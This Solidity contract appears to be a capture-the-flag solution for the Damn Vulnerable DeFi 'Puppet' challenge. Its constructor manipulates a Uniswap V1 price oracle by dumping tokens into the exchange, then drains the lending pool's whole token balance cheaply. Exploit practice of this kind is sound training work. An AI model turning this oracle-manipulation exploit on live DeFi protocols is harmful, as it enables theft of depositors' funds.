// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface uniswapExchange {
    function tokenToEthSwapInput(uint256, uint256, uint256) external;
}

contract PuppetAttackV1 {

    constructor(PuppetPool pool, address uniswap, 
        address owner,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s) payable {
        DamnValuableToken token = pool.token();

        // Call permit with the signature from the player to approve the use of the tokens
        token.permit(owner, address(this), value, deadline, v, r, s);

        // Transfer the tokens to this contract and approve uniswap to use them
        token.transferFrom(owner, address(this), value);
        token.approve(uniswap, value);

        // Sell our tokens to increase the token balance in uniswap
        uniswapExchange(uniswap).tokenToEthSwapInput(value, 1, deadline);

        // Calculate how much ETH we need to get all the tokens of the pool
        uint256 ethToBorrowOneToken = pool.calculateDepositRequired(token.balanceOf(address(pool)));

        // Borrow all the token from the pool
        pool.borrow{value: ethToBorrowOneToken}(token.balanceOf(address(pool)), owner);        
        payable(owner).transfer(address(this).balance);
    }

}